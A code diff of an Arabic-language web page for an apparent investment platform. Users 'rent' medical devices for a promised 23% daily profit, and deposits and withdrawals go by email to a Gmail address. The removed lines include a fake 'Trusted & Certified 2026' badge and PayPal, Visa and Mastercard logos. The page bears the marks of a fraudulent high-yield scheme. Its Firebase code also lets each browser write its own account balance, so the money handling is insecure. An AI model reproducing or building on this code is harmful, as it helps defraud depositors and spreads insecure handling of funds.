@@ -57,28 +57,7 @@ header{text-align:center;padding:20px}
 }
 .toast.show{top:30px}
 
-/* TRUST */
-.trust-section{
-  margin:30px 20px;padding:25px;
-  background:rgba(255,255,255,.05);
-  border-radius:20px;text-align:center
-}
-.trust-logo{
-  display:inline-block;margin-bottom:15px;
-  padding:10px 20px;border-radius:30px;
-  background:linear-gradient(135deg,#00ffea,#0066ff);
-  color:#000;font-weight:bold;cursor:pointer
-}
-.trust-badges{
-  display:grid;
-  grid-template-columns:repeat(auto-fit,minmax(80px,1fr));
-  gap:15px;margin-top:20px
-}
-.trust-badges img{width:45px;opacity:.8;transition:.3s}
-.trust-badges img:hover{opacity:1;transform:scale(1.1)}
-
-/* POPUPS */
-.popup,.modal{
+.modal{
   position:fixed;top:50%;left:50%;
   transform:translate(-50%,-50%);
   background:#fff;color:#000;
@@ -86,7 +65,7 @@ header{text-align:center;padding:20px}
   padding:20px;text-align:center;
   display:none;z-index:5000
 }
-.popup button,.modal button{
+.modal button{
   margin-top:10px;padding:8px 15px;
   border:none;border-radius:20px;
   background:#0066ff;color:#fff;cursor:pointer
@@ -94,32 +73,6 @@ header{text-align:center;padding:20px}
 .modal input{
   width:100%;padding:10px;margin-top:10px;
   border-radius:15px;border:1px solid #ccc
-}
-.modal p{font-size:13px;color:#555;margin:8px 0}
-
-/* زر عرض المزيد */
-.more-btn-container{
-  display:flex;
-  justify-content:center;
-  margin:20px 0;
-}
-
-.more-btn{
-  padding:12px 25px;
-  border:none;
-  border-radius:30px;
-  background:linear-gradient(135deg,#ff9800,#ff5722);
-  color:#fff;
-  font-weight:bold;
-  cursor:pointer;
-  font-size:14px;
-  box-shadow:0 8px 20px rgba(0,0,0,.35);
-  transition: transform 0.3s, box-shadow 0.3s;
-}
-
-.more-btn:hover{
-  transform:scale(1.05);
-  box-shadow:0 12px 30px rgba(0,0,0,.45);
 }
 </style>
 </head>
@@ -137,29 +90,15 @@ header{text-align:center;padding:20px}
 
 <header>
 <h1>🏥 X.VÍČÞØM</h1>
-<p>استثمارات موثوقة | أرباح يومية | منصات عالمية</p>
+<p>استثمارات موثوقة | أرباح يومية</p>
 </header>
 
-<div class="more-btn-container">
-  <button class="more-btn" onclick="moreDevices()">عرض المزيد من الأجهزة</button>
-</div>
-
-<div class="trust-section">
-<div class="trust-logo" onclick="toggleModal('trustPopup')">✔️ Trusted & Certified 2026</div>
-<div class="trust-badges">
-<img src="https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom.svg">
-<img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
-<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
-</div>
-</div>
-
-<!-- POPUPS -->
 <div class="container" id="products"></div>
 
 <div class="modal" id="withdrawBox">
 <h3>طلب سحب</h3>
 <input type="number" id="withdrawAmount" placeholder="المبلغ">
-<p>الحد الأدنى للسحب: <strong>230 ج</strong></p>
+<p>الحد الأدنى للسحب: 230 ج</p>
 <button onclick="requestWithdraw()">إرسال</button>
 <button onclick="toggleModal('withdrawBox')">إغلاق</button>
 </div>
@@ -175,7 +114,7 @@ header{text-align:center;padding:20px}
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getAuth, onAuthStateChanged, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 import { getFirestore, doc, onSnapshot, updateDoc, setDoc, getDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 const firebaseConfig = {
@@ -191,10 +130,11 @@ const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
 
-let currentUID = null;
-let balance = 0;
-let transactions = [];
+let currentUID=null;
+let balance=0;
+let transactions=[];
 
+/* ✅ الأجهزة كلها زي ما هي */
 const products=[
   {id:1,name:"جهاز ضغط دم",price:900,img:"images2/Press.jpg"},
   {id:2,name:"جهاز ECG",price:2500,img:"images2/Ecg.jpg"},
@@ -206,165 +146,122 @@ const products=[
   {id:8,name:"جهاز سكر",price:700,img:"images2/Sugar.jpg"}
 ];
 
-/* تسجيل دخول مجهول */
-signInAnonymously(auth).catch(err => {
-  console.error("Firebase Anonymous Auth error:", err);
-  showToast("❌ حدث خطأ في تسجيل الدخول");
-});
+signInAnonymously(auth);
 
-onAuthStateChanged(auth, async (user) => {
-  if (!user) return;
+onAuthStateChanged(auth, async user=>{
+  if(!user) return;
+  currentUID=user.uid;
+  const ref=doc(db,"users",currentUID);
 
-  currentUID = user.uid;
-  const userDoc = doc(db,"users",currentUID);
-
-  // تحقق إذا المستند موجود
-  const docSnap = await getDoc(userDoc);
-  if (!docSnap.exists()) {
-    // المستند جديد، نعمله مع القيم الافتراضية
-    await setDoc(userDoc, { balance:0, transactions:[], rented:{} });
+  const snap=await getDoc(ref);
+  if(!snap.exists()){
+    await setDoc(ref,{balance:0,transactions:[],rented:{}});
   }
 
-  // الاشتراك في التغييرات الحية
-  onSnapshot(userDoc, (docSnap) => {
-    const data = docSnap.data();
-    balance = data.balance || 0;
-    transactions = data.transactions || [];
-    document.getElementById("balance").innerText = balance;
-    renderProducts(data.rented || {});
+  onSnapshot(ref,s=>{
+    const d=s.data();
+    balance=d.balance||0;
+    transactions=d.transactions||[];
+    document.getElementById("balance").innerText=balance;
+    renderProducts(d.rented||{});
   });
 });
 
-
-
-/* دوال عامة */
-window.showToast = function(m){
-  const t = document.getElementById("toast");
-  t.innerText = m; t.classList.add("show");
-  setTimeout(()=>t.classList.remove("show"),3000);
-}
-
-window.toggleModal = function(id){
-  const m = document.getElementById(id);
-  m.style.display = m.style.display==="block"?"none":"block";
-}
-
-/* render products */
 function renderProducts(rented){
-  const container = document.getElementById("products");
-  container.innerHTML = "";
+  const c=document.getElementById("products");
+  c.innerHTML="";
   products.forEach(p=>{
-    const card = document.createElement("div");
-    card.className = "card";
-    card.innerHTML = `
+    const d=document.createElement("div");
+    d.className="card";
+    d.innerHTML=`
       <img src="${p.img}">
       <h4>${p.name}</h4>
       <p>${p.price} ج</p>
       <p style="color:#00c853">ربح يومي ${(p.price*0.23).toFixed(0)} ج</p>
     `;
-    const btn = document.createElement("button");
-    btn.textContent = rented[p.id]?"تم التأجير":"تأجير";
-    btn.disabled = rented[p.id];
-    btn.addEventListener("click", () => rentProduct(p.id,p.price));
-    card.appendChild(btn);
-    container.appendChild(card);
+    const b=document.createElement("button");
+    b.textContent=rented[p.id]?"تم التأجير":"تأجير";
+    b.disabled=rented[p.id];
+    b.onclick=()=>rentProduct(p.id,p.price);
+    d.appendChild(b);
+    c.appendChild(d);
   });
 }
 
-/* تأجير */
-async function rentProduct(id, price){
-  if(!currentUID){ showToast("❌ جاري التحميل..."); return; }
-  if(balance < price){ showToast("❌ الرصيد غير كافي"); return; }
+async function rentProduct(id,price){
+  const ref=doc(db,"users",currentUID);
+  const snap=await getDoc(ref);
+  const bal=snap.data().balance;
+  if(bal<price) return showToast("❌ الرصيد غير كافي");
 
-  const userDoc = doc(db,"users",currentUID);
-  const newBalance = balance - price;
-
-  await updateDoc(userDoc, {
-    balance: newBalance,
-    [`rented.${id}`]: true,
-    transactions: arrayUnion({type:"تأجير",amount:-price,date:new Date().toLocaleString()})
+  await updateDoc(ref,{
+    balance:bal-price,
+    [`rented.${id}`]:true,
+    transactions:arrayUnion({type:"تأجير",amount:-price,date:Date.now()})
   });
-
-  const docSnap = await getDoc(userDoc);
-  const data = docSnap.data();
-  balance = data.balance;
-  transactions = data.transactions;
-  document.getElementById("balance").innerText = balance;
-  renderProducts(data.rented || {});
-  showToast("تم التأجير ✅");
+  showToast("✅ تم التأجير");
 }
-window.rent = rentProduct;
 
-/* تسجيل يومي */
 async function dailyLogin(){
-  if(!currentUID) return;
-  const userDoc = doc(db,"users",currentUID);
-  const lastDaily = transactions.filter(t=>t.type==="مكافأة").pop()?.date || 0;
-  const now = Date.now();
-  if(now - new Date(lastDaily).getTime() >= 86400000){
-    balance += 40;
-    document.getElementById("balance").innerText = balance;
-    await updateDoc(userDoc,{balance, transactions: arrayUnion({type:"مكافأة",amount:40,date:new Date().toLocaleString()})});
-    showToast("✅ تم تسجيل الدخول اليومي");
-  }else showToast("⏳ مرة واحدة كل 24 ساعة");
-}
-window.dailyLogin = dailyLogin;
+  const ref=doc(db,"users",currentUID);
+  const snap=await getDoc(ref);
+  const tx=snap.data().transactions||[];
+  const last=tx.filter(t=>t.type==="مكافأة").pop()?.date||0;
+  if(Date.now()-last<86400000) return showToast("⏳ مرة واحدة كل 24 ساعة");
 
-/* إضافة الربح اليومي */
-async function addDailyProfit(){
-  if(!currentUID) return;
-  const userDoc = doc(db,"users",currentUID);
-  const docSnap = await getDoc(userDoc);
-  const data = docSnap.data();
-  const rented = data.rented || {};
-  let totalProfit = 0;
-  products.forEach(p=>{
-    if(rented[p.id]) totalProfit += p.price*0.23;
+  await updateDoc(ref,{
+    balance:snap.data().balance+40,
+    transactions:arrayUnion({type:"مكافأة",amount:40,date:Date.now()})
   });
-  if(totalProfit>0){
-    balance += totalProfit;
-    document.getElementById("balance").innerText = balance;
-    await updateDoc(userDoc,{balance, transactions: arrayUnion({type:"ربح يومي",amount:totalProfit,date:new Date().toLocaleString()})});
-    showToast(`💰 تم إضافة الربح اليومي: ${totalProfit.toFixed(0)} ج`);
-  }
+  showToast("✅ تم التسجيل اليومي");
 }
 
-/* سحب */
 async function requestWithdraw(){
-  if(!currentUID) return;
-  const a = +document.getElementById("withdrawAmount").value;
-  if(a<230){ showToast("❌ الحد الأدنى للسحب 230 ج"); return; }
-  if(a>balance){ showToast("❌ الرصيد غير كافي"); return; }
+  const a=+withdrawAmount.value;
+  const ref=doc(db,"users",currentUID);
+  const snap=await getDoc(ref);
+  if(a<230||a>snap.data().balance) return showToast("❌ مبلغ غير صالح");
 
-  balance -= a;
-  document.getElementById("balance").innerText = balance;
-  const userDoc = doc(db,"users",currentUID);
-  await updateDoc(userDoc,{balance, transactions: arrayUnion({type:"سحب",amount:-a,date:new Date().toLocaleString()})});
-  showToast("✅ طلب السحب تم");
-  window.location.href=`mailto:btechno1010@gmail.com?subject=طلب سحب&body=المبلغ: ${a}`;
+  await updateDoc(ref,{
+    balance:snap.data().balance-a,
+    transactions:arrayUnion({type:"سحب",amount:-a,date:Date.now()})
+  });
+  window.location.href=`mailto:btechno1010@gmail.com?subject=طلب سحب&body=المبلغ:${a}`;
 }
-window.requestWithdraw = requestWithdraw;
 
-/* إيداع */
 async function addFunds(){
-  if(!currentUID) return;
-  const a = +document.getElementById("addAmount").value;
-  if(a<=0){ showToast("❌ مبلغ غير صالح"); return; }
-  const userDoc = doc(db,"users",currentUID);
-  await updateDoc(userDoc,{ transactions: arrayUnion({type:"إيداع",amount:a,date:new Date().toLocaleString()})});
-  showToast("✅ طلب الإيداع تم");
-  window.location.href=`mailto:btechno1010@gmail.com?subject=طلب إيداع&body=المبلغ: ${a}`;
+  const a=+addAmount.value;
+  if(a<=0) return;
+  const ref=doc(db,"users",currentUID);
+  await updateDoc(ref,{
+    transactions:arrayUnion({type:"إيداع",amount:a,date:Date.now()})
+  });
+  window.location.href=`mailto:btechno1010@gmail.com?subject=طلب إيداع&body=المبلغ:${a}`;
 }
-window.addFunds = addFunds;
 
-/* سجل المعاملات */
 function showTransactions(){
-  if(transactions.length===0){ alert("لا يوجد سجل"); return; }
-  alert(transactions.map(t=>`${t.date} | ${t.type} | ${t.amount}`).join("\n"));
+  alert(transactions.map(t=>`${new Date(t.date).toLocaleString()} | ${t.type} | ${t.amount}`).join("\n"));
 }
-window.showTransactions = showTransactions;
+
+function toggleModal(id){
+  const m=document.getElementById(id);
+  m.style.display=m.style.display==="block"?"none":"block";
+}
+
+function showToast(m){
+  const t=document.getElementById("toast");
+  t.innerText=m;
+  t.classList.add("show");
+  setTimeout(()=>t.classList.remove("show"),3000);
+}
+
+window.dailyLogin=dailyLogin;
+window.requestWithdraw=requestWithdraw;
+window.addFunds=addFunds;
+window.showTransactions=showTransactions;
+window.toggleModal=toggleModal;
 </script>
 
-
+</div>
 </body>
-</html>   
+</html>
